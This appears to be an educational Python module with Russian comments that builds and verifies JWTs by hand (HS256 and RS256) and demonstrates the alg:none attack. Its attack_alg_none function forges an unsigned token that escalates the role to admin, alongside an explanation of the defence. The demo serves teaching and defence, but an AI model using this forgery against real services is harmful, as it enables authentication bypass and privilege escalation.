import hmac
import hashlib
import json
import base64
import time
import os
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend


# ──────────────────────────────────────────────
#  Утилиты: Base64URL
# ──────────────────────────────────────────────

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s: str) -> bytes:
    padding_needed = 4 - len(s) % 4
    if padding_needed != 4:
        s += '=' * padding_needed
    return base64.urlsafe_b64decode(s)


# ──────────────────────────────────────────────
#  HMAC-SHA256 JWT
# ──────────────────────────────────────────────

def create_jwt_hmac(payload: dict, secret: str) -> dict:
    """Создать JWT вручную через HMAC-SHA256."""
    steps = []

    # Шаг 1: Заголовок
    header = {"alg": "HS256", "typ": "JWT"}
    header_json = json.dumps(header, separators=(',', ':'))
    header_b64 = b64url_encode(header_json.encode())
    steps.append({
        "title": "Шаг 1: Создание заголовка (Header)",
        "detail": f"JSON: {header_json}\nBase64URL: {header_b64}"
    })

    # Шаг 2: Payload
    payload_json = json.dumps(payload, separators=(',', ':'), ensure_ascii=False)
    payload_b64 = b64url_encode(payload_json.encode())
    steps.append({
        "title": "Шаг 2: Кодирование payload",
        "detail": f"JSON: {payload_json}\nBase64URL: {payload_b64}"
    })

    # Шаг 3: Подпись
    signing_input = f"{header_b64}.{payload_b64}"
    signature = hmac.new(
        secret.encode(),
        signing_input.encode(),
        hashlib.sha256
    ).digest()
    signature_b64 = b64url_encode(signature)
    steps.append({
        "title": "Шаг 3: Вычисление подписи HMAC-SHA256",
        "detail": (
            f"Входные данные: {signing_input[:60]}...\n"
            f"Ключ: {secret}\n"
            f"HMAC-SHA256 (hex): {signature.hex()}\n"
            f"Base64URL подпись: {signature_b64}"
        )
    })

    token = f"{signing_input}.{signature_b64}"
    steps.append({
        "title": "Шаг 4: Сборка токена",
        "detail": f"header.payload.signature\n{token}"
    })

    return {
        "token": token,
        "header": header,
        "payload": payload,
        "header_b64": header_b64,
        "payload_b64": payload_b64,
        "signature_b64": signature_b64,
        "steps": steps
    }


def verify_jwt_hmac(token: str, secret: str) -> dict:
    """Верифицировать JWT с HMAC-SHA256."""
    steps = []
    try:
        parts = token.strip().split('.')
        if len(parts) != 3:
            return {"valid": False, "error": "Неверный формат токена (ожидается 3 части)", "steps": steps}

        header_b64, payload_b64, sig_b64 = parts

        # Декодируем заголовок
        header = json.loads(b64url_decode(header_b64))
        steps.append({"title": "Шаг 1: Декодирование заголовка", "detail": json.dumps(header, indent=2, ensure_ascii=False)})

        if header.get("alg") == "none":
            return {
                "valid": False,
                "error": "⚠️ АТАКА ОБНАРУЖЕНА: alg:none — подпись отсутствует! Токен отклонён.",
                "attack": True,
                "steps": steps
            }

        # Декодируем payload
        payload = json.loads(b64url_decode(payload_b64))
        steps.append({"title": "Шаг 2: Декодирование payload", "detail": json.dumps(payload, indent=2, ensure_ascii=False)})

        # Проверяем exp
        if "exp" in payload:
            if time.time() > payload["exp"]:
                return {"valid": False, "error": "Токен истёк (exp)", "payload": payload, "steps": steps}

        # Пересчитываем подпись
        signing_input = f"{header_b64}.{payload_b64}"
        expected_sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
        expected_b64 = b64url_encode(expected_sig)

        steps.append({
            "title": "Шаг 3: Пересчёт подписи",
            "detail": f"Ожидаемая: {expected_b64}\nПолученная: {sig_b64}"
        })

        if hmac.compare_digest(expected_b64, sig_b64):
            steps.append({"title": "Шаг 4: Результат", "detail": "✅ Подписи совпадают — токен действителен"})
            return {"valid": True, "header": header, "payload": payload, "steps": steps}
        else:
            steps.append({"title": "Шаг 4: Результат", "detail": "❌ Подписи не совпадают — токен изменён или неверный ключ"})
            return {"valid": False, "error": "Подпись не совпадает", "steps": steps}

    except Exception as e:
        return {"valid": False, "error": f"Ошибка парсинга: {str(e)}", "steps": steps}


# ──────────────────────────────────────────────
#  RSA JWT (RS256)
# ──────────────────────────────────────────────

def generate_rsa_keys():
    """Генерация RSA-2048 пары ключей."""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    ).decode()
    public_pem = private_key.public_key().private_bytes if False else private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()
    return private_key, private_pem, public_pem


def create_jwt_rsa(payload: dict, private_key) -> dict:
    """Создать JWT с RSA-SHA256 подписью."""
    steps = []

    header = {"alg": "RS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':'), ensure_ascii=False).encode())

    steps.append({"title": "Шаг 1: Header + Payload", "detail": f"Header B64: {header_b64}\nPayload B64: {payload_b64}"})

    signing_input = f"{header_b64}.{payload_b64}"
    signature = private_key.sign(
        signing_input.encode(),
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    signature_b64 = b64url_encode(signature)

    steps.append({
        "title": "Шаг 2: RSA-SHA256 подпись",
        "detail": f"Подписываем приватным ключом RSA-2048\nРазмер подписи: {len(signature)} байт\nBase64URL: {signature_b64[:40]}..."
    })

    token = f"{signing_input}.{signature_b64}"
    steps.append({"title": "Шаг 3: Готовый токен RS256", "detail": token[:80] + "..."})

    return {
        "token": token,
        "header": header,
        "payload": payload,
        "steps": steps
    }


def verify_jwt_rsa(token: str, public_key_pem: str) -> dict:
    """Верифицировать RSA JWT."""
    steps = []
    try:
        parts = token.strip().split('.')
        if len(parts) != 3:
            return {"valid": False, "error": "Неверный формат", "steps": steps}

        header_b64, payload_b64, sig_b64 = parts
        header = json.loads(b64url_decode(header_b64))
        payload = json.loads(b64url_decode(payload_b64))

        steps.append({"title": "Декодирование", "detail": f"alg: {header.get('alg')}\npayload: {json.dumps(payload, indent=2, ensure_ascii=False)}"})

        public_key = serialization.load_pem_public_key(public_key_pem.encode(), backend=default_backend())
        signing_input = f"{header_b64}.{payload_b64}"
        signature = b64url_decode(sig_b64)

        public_key.verify(signature, signing_input.encode(), padding.PKCS1v15(), hashes.SHA256())
        steps.append({"title": "Результат", "detail": "✅ RSA подпись верна — токен подлинный"})
        return {"valid": True, "header": header, "payload": payload, "steps": steps}

    except Exception as e:
        steps.append({"title": "Результат", "detail": f"❌ Ошибка верификации: {str(e)}"})
        return {"valid": False, "error": str(e), "steps": steps}


# ──────────────────────────────────────────────
#  Атака alg:none
# ──────────────────────────────────────────────

def attack_alg_none(original_token: str, new_payload: dict = None) -> dict:
    """
    Демонстрация атаки alg:none:
    Меняем заголовок на alg:none, подпись убираем или оставляем пустой.
    """
    parts = original_token.split('.')
    orig_payload = json.loads(b64url_decode(parts[1]))

    if new_payload is None:
        # Повышаем права: меняем role на admin
        new_payload = dict(orig_payload)
        new_payload["role"] = "admin"
        new_payload["sub"] = "attacker"

    malicious_header = {"alg": "none", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(malicious_header, separators=(',', ':')).encode())
    payload_b64 = b64url_encode(json.dumps(new_payload, separators=(',', ':'), ensure_ascii=False).encode())

    # Без подписи (или пустая)
    forged_token = f"{header_b64}.{payload_b64}."

    return {
        "original_payload": orig_payload,
        "forged_payload": new_payload,
        "forged_token": forged_token,
        "explanation": (
            "Уязвимая библиотека принимает alg:none и пропускает проверку подписи. "
            "Атакующий меняет payload (например, role→admin) и убирает подпись. "
            "Защита: ВСЕГДА жёстко указывать ожидаемый алгоритм при верификации."
        )
    }


def decode_token_parts(token: str) -> dict:
    """Просто декодировать все части токена без верификации."""
    try:
        parts = token.strip().split('.')
        if len(parts) < 2:
            return {"error": "Неверный формат"}
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return {
            "header": header,
            "payload": payload,
            "has_signature": len(parts) == 3 and len(parts[2]) > 0
        }
    except Exception as e:
        return {"error": str(e)}
